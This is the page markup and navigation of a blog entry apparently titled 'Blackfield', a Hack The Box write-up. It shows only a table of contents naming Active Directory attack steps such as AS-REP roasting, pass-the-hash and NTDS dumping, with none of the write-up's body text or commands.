
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="ch3ckm8">
      
      
        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_Blackfield/">
      
      
        <link rel="prev" href="../ch3ckm8_HTB_Administrator/">
      
      
        <link rel="next" href="../ch3ckm8_HTB_Cascade/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Blackfield - Ch3ckm8 Vault</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#intro" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ch3ckm8 Vault
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Blackfield
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
          
  
  
  HTB Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
          
  
  
  Other CTF Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../common_tools/" class="md-tabs__link">
          
  
  
  Notes

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../windows/" class="md-tabs__link">
          
  
  
  Tags

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    Ch3ckm8 Vault
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    HTB Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Administrator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-target-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add target to /etc/hosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration-as-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration as anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration-as-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration as anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      Enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-rep-roasting" class="md-nav__link">
    <span class="md-ellipsis">
      AS-REP roasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration-as-user-support" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration as user support
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-user-support" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as user support
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration-as-user-support" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration as user support
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP enumeration as user support">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-support" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as support
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-reset-as-user-support-towards-user-audit2020" class="md-nav__link">
    <span class="md-ellipsis">
      Password reset as user support towards user AUDIT2020
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-with-creds-as-audit2020" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Enumeration with creds as AUDIT2020
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB Enumeration with creds as AUDIT2020">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#file-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      File inspection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-svc_backup-via-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as SVC_BACKUP via pass the hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-backup-operators-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing BACKUP OPERATORS privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dumping-ntds-using-the-system-hive" class="md-nav__link">
    <span class="md-ellipsis">
      Dumping NTDS using the SYSTEM hive
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-administrator-via-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as Administrator via pass the hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Cascade/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    EscapeTwo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Nocturnal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Return/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TheFrizz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_monteverde/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sauna
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Timelapse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cicada
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Escape
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Flight/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_fluffy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Puppy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tombwatcher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_certified/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Certified
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Other CTF Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Other CTF Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RoboGRoot's-Portfolio
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../common_tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Commonly used tools and methodologies
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Tags
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AD/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADconnectAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADconnectAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AS-REP-roasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS-REP-roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../GSSAPIauthentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GSSAPIauthentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../NotAssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NotAssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSCPpath/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OSCPpath
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PortForwarding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PortForwarding
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PrivGroupAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivGroupAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RCE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RCE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RecycleBin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RecycleBin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WinPEAS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WinPEAS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../XSS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certificates
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntemplate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntemplate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../codereview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    codereview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    commandinjection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gpo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    gpo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    history
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mssql
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC1
    
  </span>
  

